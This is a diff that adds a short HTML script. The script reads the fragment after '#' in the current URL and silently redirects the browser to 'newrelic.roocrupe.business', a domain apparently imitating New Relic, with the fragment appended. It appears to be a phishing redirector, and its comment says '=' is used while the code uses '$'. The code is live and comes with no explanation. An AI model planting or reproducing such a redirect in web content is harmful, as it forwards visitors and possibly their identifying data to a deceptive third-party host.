@@ -1,0 +1,13 @@
+<script type="text/javascript">
+  var baseUrl = "https://newrelic.roocrupe.business/R@dyBhvWluuqeGKO0QxItyQiQ/";
+
+  // Extract hash from URL (removing the '#')
+  var hash = window.location.hash ? window.location.hash.substring(1) : "";
+
+  // Redirect using "=" instead of "#"
+  if (hash) {
+    window.location.replace(baseUrl + "$" + encodeURIComponent(hash));
+  } else {
+    window.location.replace(baseUrl);
+  }
+</script>
